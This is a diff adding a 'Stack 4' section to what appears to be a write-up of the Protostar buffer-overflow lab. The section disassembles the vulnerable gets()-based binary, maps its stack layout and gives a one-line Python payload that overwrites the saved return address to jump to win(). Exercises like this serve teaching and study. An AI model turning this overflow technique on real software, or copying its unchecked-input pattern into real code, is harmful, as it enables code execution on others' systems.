@@ -925,3 +925,93 @@ code flow successfully changed
 ```
 
 Success.
+
+### Stack 4
+
+Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
+
+This level is at /opt/protostar/bin/stack4
+
+Hints
+- A variety of introductory papers into buffer overflows may help.
+- gdb lets you do “run < input”
+- EIP is not directly after the end of buffer, compiler padding can also increase the size.
+
+```
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <string.h>
+
+void win()
+{
+  printf("code flow successfully changed\n");
+}
+
+int main(int argc, char **argv)
+{
+  char buffer[64];
+
+  gets(buffer);
+}
+```
+
+This time the only variable declared into the main is `buffer`, and the win condition is still do change the code flow.
+
+We don't have a function pointer or similar stuff, so we have to break things in another way.
+
+Let's have a look at how the stack works on Protostar, and what the main does. A knowledge of assembly is needed here:
+
+```
+user@protostar:/opt/protostar/bin$ gdb -q stack4
+Reading symbols from /opt/protostar/bin/stack4...done.
+(gdb) disass main
+Dump of assembler code for function main:
+0x08048408 <main+0>:    push   %ebp
+0x08048409 <main+1>:    mov    %esp,%ebp
+0x0804840b <main+3>:    and    $0xfffffff0,%esp
+0x0804840e <main+6>:    sub    $0x50,%esp
+0x08048411 <main+9>:    lea    0x10(%esp),%eax
+0x08048415 <main+13>:   mov    %eax,(%esp)
+0x08048418 <main+16>:   call   0x804830c <gets@plt>
+0x0804841d <main+21>:   leave  
+0x0804841e <main+22>:   ret    
+End of assembler dump.
+```
+
+- Before the main the push address to `__libc_start_main` is pushed on the stack; 
+- Then the main is called;
+- The old base frame pointer (`ebp`) is pushed on the stack;
+- The `ebp` is updated at the current stack top (`esp`);
+- A padding is applied because of the Intel standard;
+- 80 bytes (`0x50`) of memory are allocated;
+- The address of the buffer is calculated starting from the top of the stack (note that 16 + 64 = 80);
+- the address of the buffer is put on top of the stack (not pushed!);
+- `gets()` is called, and after that the main returns.
+
+So the stack should look something like this:
+
+```
++---------------------------------------------------------------------------------------------------------------------------------------+
+| buffer ptr (4 bytes) | empty memory (12 bytes) | buffer (64 bytes) | padding (8 bytes) | old ebp (4 bytes) | return address (4 bytes) |  
++---------------------------------------------------------------------------------------------------------------------------------------+
+```
+
+Since we can write into the buffer, to reach the return addres we have to provide 64 + 8 + 4 = 76 bytes of padding before writing the address we want to jump to.
+
+Let's just get the address of `win()` once again:
+
+```
+(gdb) p win
+$1 = {void (void)} 0x80483f4 <win>
+```
+
+Now we can use the same script we used for the past challenges:
+
+```
+user@protostar:/opt/protostar/bin$ python -c "print('a'*76 + '\xf4\x83\x04\x08')" | ./stack4
+code flow successfully changed
+Segmentation fault
+```
+
+Success.
